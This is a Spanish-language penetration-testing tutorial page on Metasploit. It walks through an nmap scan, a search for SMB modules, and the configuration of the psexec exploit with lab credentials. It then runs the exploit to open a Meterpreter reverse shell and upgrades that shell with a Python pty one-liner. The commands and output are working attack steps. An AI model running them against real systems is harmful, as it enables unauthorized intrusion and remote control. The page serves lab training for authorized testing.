
# Metasploit Payloads

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Automatización de Payloads con Metasploit</mark>

***

[Metasploit](https://www.metasploit.com/) es un marco de ataque automatizado desarrollado por `Rapid7` que agiliza el proceso de explotación de vulnerabilidades mediante el uso de módulos prediseñados que contienen opciones fáciles de usar para explotar vulnerabilidades y entregar cargas útiles para obtener un shell en un sistema vulnerable. Puede hacer que explotar un sistema vulnerable sea tan fácil que algunos proveedores de capacitación en ciberseguridad limitan la cantidad de veces que se puede utilizar en los exámenes de laboratorio.&#x20;

En esta sección, interactuaremos con Metasploit en Kali Linux. Usaremos cargas útiles prediseñadas (`modules)` y manuales con `MSFVenom`. Es importante tener en cuenta que muchas empresas de ciberseguridad establecidas utilizan la edición de pago de Metasploit (`Metasploit Pro`) para realizar pruebas de penetración, auditorías de seguridad e incluso campañas de ingeniería social. Si desea explorar las diferencias entre la edición comunitaria y Metasploit Pro, puede consultar este [cuadro comparativo](https://www.rapid7.com/products/metasploit/download/editions/) .

***

## <mark style="color:purple;">Practicando con Metasploit</mark>

Podríamos dedicar el resto de este módulo a cubrir todo lo relacionado con Metasploit, pero solo llegaremos a trabajar con los conceptos básicos dentro del contexto de shells y cargas útiles.

Comencemos a trabajar prácticamente con Metasploit iniciando la consola del marco Metasploit como root ( `sudo msfconsole`)

### **Iniciando MSF**

```bash
afsh4ck$ sudo msfconsole 
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 > 
```

Podemos ver que hay arte ASCII creativo presentado como banner en el lanzamiento y algunos números de particular interés.

* `2131` Exploits
* `592` Payloads

Estos números pueden cambiar a medida que los desarrolladores agregan y eliminan código o si importa un módulo para usarlo en Metasploit. Familiaricémonos con las cargas útiles de Metasploit usando un clásico `exploit` que puede usarse para comprometer un sistema Windows. Recuerde que Metasploit se puede utilizar para algo más que explotación. También podemos usar diferentes módulos para escanear y enumerar objetivos.

En este caso, usaremos los resultados de la enumeración de un escaneo `nmap` para elegir un módulo de Metasploit para usar.

### **Escaneo NMAP**

```bash
afsh4ck$ nmap -sC -sV -Pn 10.129.164.25

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

En el resultado, vemos varios puertos estándar que normalmente están abiertos en un sistema Windows de forma predeterminada. Recuerde que el escaneo y la enumeración es una excelente manera de saber qué sistema operativo (Windows o Linux) está ejecutando nuestro objetivo para encontrar un módulo apropiado para ejecutar con Metasploit. Vayamos con `SMB`(puerto `445`) como vector de ataque potencial.

Una vez que tengamos esta información, podemos usar la función de búsqueda de Metasploit para descubrir módulos asociados con SMB. En `msfconsole`, podemos emitir el comando `search` para obtener una lista de módulos asociados con vulnerabilidades SMB:

### **Buscando dentro de Metasploit**

```shell-session
msf6 > search smb

Matching Modules
================

#    Name                                                          Disclosure Date    Rank   Check  Description
  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution

```

Veremos una larga lista de `modulos` asociados a nuestra búsqueda. Observe el formato en el que se encuentra cada módulo. Cada módulo tiene un número que aparece en el extremo izquierdo de la tabla para facilitar la selección del módulo : a `Name`,, y .`Disclosure DateRankCheckDescription`

El número a la "izquierda" de cada módulo potencial es un número relativo basado en su búsqueda que puede cambiar a medida que se agregan módulos a Metasploit. No espere que este número coincida cada vez que realice la búsqueda o intente utilizar el módulo.

Veamos un módulo en particular para entenderlo en el contexto de las cargas útiles.

`56 exploit/windows/smb/psexec`

<table data-header-hidden><thead><tr><th width="160"></th><th></th></tr></thead><tbody><tr><td>Output</td><td>Significado</td></tr><tr><td><code>56</code></td><td>El número asignado al módulo en la tabla dentro del contexto de la búsqueda. Este número facilita la selección. Podemos usar el comando <code>use 56</code>para seleccionar el módulo.</td></tr><tr><td><code>exploit/</code></td><td>Esto define el tipo de módulo. En este caso, se trata de un módulo de explotación. Muchos módulos de explotación en MSF incluyen la carga útil que intenta establecer una sesión de shell.</td></tr><tr><td><code>windows/</code></td><td>Esto define la plataforma a la que nos dirigimos. En este caso, sabemos que el objetivo es Windows, por lo que el exploit y la carga útil serán para Windows.</td></tr><tr><td><code>smb/</code></td><td>Esto define el servicio para el cual se escribe la carga útil en el módulo.</td></tr><tr><td><code>psexec</code></td><td>Esto define la herramienta que se cargará en el sistema de destino si es vulnerable.</td></tr></tbody></table>

Una vez que seleccionemos el módulo, notaremos un cambio en el mensaje que nos brinda la posibilidad de configurar el módulo en función de parámetros específicos de nuestro entorno.

### **Selección de opciones**

```shell-session
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > 
```

Observe cómo `exploit` está fuera del paréntesis. Esto puede interpretarse como que el tipo de módulo MSF es un exploit y que el exploit y la carga útil específicos están escritos para Windows. El vector de ataque es `SMB`, y la carga útil de Meterpreter se entregará mediante [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) . Aprendamos más sobre el uso de este exploit y la entrega de la carga útil mediante el `options`comando.

### **Examinar las opciones de un exploit**

```shell-session
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo
                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Esta es un área donde Metasploit brilla en términos de facilidad de uso. En la salida de las opciones del módulo, vemos varias opciones y configuraciones con una descripción de lo que significa cada configuración. No usaremos `SERVICE_DESCRIPTION` y `SERVICE_DISPLAY_NAME` en `SERVICE_NAME`esta sección. Observe cómo este exploit en particular utilizará una conexión de shell TCP inversa utilizando `Meterpreter`. Un shell Meterpreter nos brinda mucha más funcionalidad que un shell inverso TCP sin formato, como establecimos en las secciones anteriores de este módulo. Es la carga útil predeterminada que se utiliza en Metasploit.

Utilizamos el comando `set` para configurar los siguientes ajustes como tales:

### **Opciones de configuración**

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Estas configuraciones garantizarán que nuestra carga útil se entregue al destino adecuado ( `RHOSTS`), se cargue en el recurso compartido administrativo predeterminado ( `ADMIN$`) utilizando credenciales ( `SMBPass`& `SMBUser`) y luego inicie una conexión de shell inversa con nuestra máquina host local ( `LHOST`).

Estas configuraciones serán específicas de la dirección IP en su cuadro de ataque y en el cuadro de destino. Además de las credenciales, puede reunirse para un compromiso. Podemos configurar la dirección IP del túnel VPN LHOST (host local) o la ID de la interfaz del túnel VPN.

### **Exploit**

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```

Después de ejecutar el comando `exploit`, se ejecuta el exploit y se intenta entregar la carga útil al objetivo utilizando la carga útil de Meterpreter. Metasploit informa cada paso de este proceso, como se ve en el resultado. Sabemos que esto fue exitoso porque se envió el `stage` exitosamente, lo que estableció una sesión de shell de Meterpreter ( `meterpreter >`) y una sesión de shell a nivel de sistema. Tenga en cuenta que Meterpreter es una carga útil que utiliza la inyección de DLL en memoria para establecer sigilosamente un canal de comunicación entre una caja de ataque y un objetivo. Las credenciales y el vector de ataque adecuados pueden brindarnos la capacidad de cargar y descargar archivos, ejecutar comandos del sistema, ejecutar un registrador de teclas, crear/iniciar/detener servicios, administrar procesos y más.

En este caso, como se detalla en la [documentación del módulo Rapid 7](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/) : "Este módulo utiliza un nombre de usuario y contraseña de administrador válidos (o hash de contraseña) para ejecutar una carga útil arbitraria. Este módulo es similar a la utilidad "psexec" proporcionada por SysInternals. Este módulo "Ahora puede limpiarse por sí mismo. El servicio creado por esta herramienta utiliza un nombre y una descripción elegidos al azar".

Al igual que otros intérpretes de lenguaje de comandos (Bash, PowerShell, ksh, etc.), las sesiones de shell de Meterpreter nos permiten emitir un conjunto de comandos que podemos usar para interactuar con el sistema de destino. Podemos usar `?` para ver una lista de comandos que podemos usar. Notaremos limitaciones con el shell Meterpreter, por lo que es bueno intentar usar el comando `shell` para colocarlo en un shell a nivel de sistema si necesitamos trabajar con el conjunto completo de comandos del sistema nativos de nuestro objetivo.

### **Shell interactiva en Windows**

```shell-session
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

Podemos ingresar a un shell del sistema ( `shell`) para obtener acceso al sistema de destino como si estuviéramos conectados y abrir una consola CMD.exe.

### **Shell interactiva en Linux**

```shell-session
meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

{% hint style="warning" %}
Vemos que en Linux al cambiar a shell tiene funcionalidad limitada y no aparece el nombre de usuario
{% endhint %}

***

### Generando un Shell TTY con Python

Cuando ingresamos al shell del sistema Linux, notamos que no hay ningún mensaje presente, pero aún podemos emitir algunos comandos del sistema. Este es un shell al que normalmente se hace referencia como `non-tty shell`. Estos shells tienen una funcionalidad limitada y a menudo pueden impedir el uso de comandos esenciales como `su`( `switch user`) y `sudo`( `super user do`), que probablemente necesitaremos si buscamos escalar privilegios. Esto sucedió porque el usuario de Apache ejecutó la carga útil en el objetivo. Nuestra sesión se establece como usuario de apache. Normalmente, los administradores no acceden al sistema como usuarios de Apache, por lo que no es necesario definir un lenguaje de intérprete de shell en las variables de entorno asociadas con Apache.

Podemos generar manualmente un shell TTY usando Python si está presente en el sistema. Siempre podemos comprobar la presencia de Python en los sistemas Linux escribiendo el comando: `which python`. Para generar la sesión de shell TTY usando Python, escribimos el siguiente comando:

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

Este comando usa Python para importar el [módulo pty](https://docs.python.org/3/library/pty.html) y luego usa la función `pty.spawn` para ejecutar `bourne shell binary`( `/bin/sh`). Ahora tenemos un mensaje ( `sh-4.2$`) y acceso a más comandos del sistema para movernos por el sistema como queramos.

***

## <mark style="color:purple;">Metasploit Cheatsheet</mark>

En la siguiente sección recojo los comandos fundamentales para realizar una explotación avanzada con Metasploit:

{% content-ref url="/pages/IOvxnjjmltS8NJovncIf" %}
[Metasploit](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/metasploit.md)
{% endcontent-ref %}
